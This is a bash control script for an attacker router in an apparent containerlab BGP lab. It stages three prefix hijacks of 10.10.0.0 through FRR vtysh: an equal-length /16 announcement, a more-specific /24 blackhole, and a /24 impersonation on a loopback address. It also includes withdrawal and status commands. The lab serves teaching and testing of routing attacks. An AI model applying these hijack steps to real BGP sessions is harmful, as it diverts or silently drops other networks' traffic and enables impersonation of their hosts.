#!/bin/bash
# Attack control for the attacker router (AS65099)
ATK="clab-bgp-multi-attacker"

case "$1" in
  none)
    echo "[*] Withdrawing all hijacks..."
    docker exec "$ATK" vtysh -c "configure terminal" \
      -c "router bgp 65099" \
      -c "address-family ipv4 unicast" \
      -c "no network 10.10.0.0/16" \
      -c "no redistribute static" 2>/dev/null
    docker exec "$ATK" vtysh -c "configure terminal" -c "no ip route 10.10.0.0/24 blackhole" 2>/dev/null
    docker exec -u 0 "$ATK" ip addr del 10.10.0.99/24 dev lo 2>/dev/null
    echo "[*] Clean. Attacker advertises nothing."
    ;;

  equal)
    echo "[*] Stage A: equal-length /16 hijack (non-deterministic)..."
    docker exec "$ATK" vtysh -c "configure terminal" \
      -c "router bgp 65099" \
      -c "address-family ipv4 unicast" \
      -c "network 10.10.0.0/16"
    echo "[*] Attacker now announcing 10.10.0.0/16"
    ;;

  specific)
    echo "[*] Stage B: more-specific /24 blackhole hijack (deterministic, silent drop)..."
    docker exec "$ATK" vtysh -c "configure terminal" -c "ip route 10.10.0.0/24 blackhole"
    docker exec "$ATK" vtysh -c "configure terminal" \
      -c "router bgp 65099" \
      -c "address-family ipv4 unicast" \
      -c "redistribute static"
    echo "[*] Attacker now announcing 10.10.0.0/24 as a blackhole"
    ;;

  impersonate)
    echo "[*] Stage C: more-specific /24 impersonation (attacker answers as the victim)..."
    docker exec -u 0 "$ATK" ip addr add 10.10.0.99/24 dev lo
    docker exec "$ATK" vtysh -c "configure terminal" \
      -c "router bgp 65099" \
      -c "address-family ipv4 unicast" \
      -c "network 10.10.0.0/24"
    echo "[*] Attacker now announcing 10.10.0.0/24 and will answer ICMP itself"
    ;;

  status)
    echo "[*] Attacker's current BGP advertisements:"
    docker exec "$ATK" vtysh -c "show bgp ipv4 unicast" 2>/dev/null
    echo "[*] Attacker's loopback addresses:"
    docker exec "$ATK" ip addr show lo
    ;;

  *)
    echo "Usage: $0 {none|equal|specific|impersonate|status}"
    exit 1
    ;;
esac
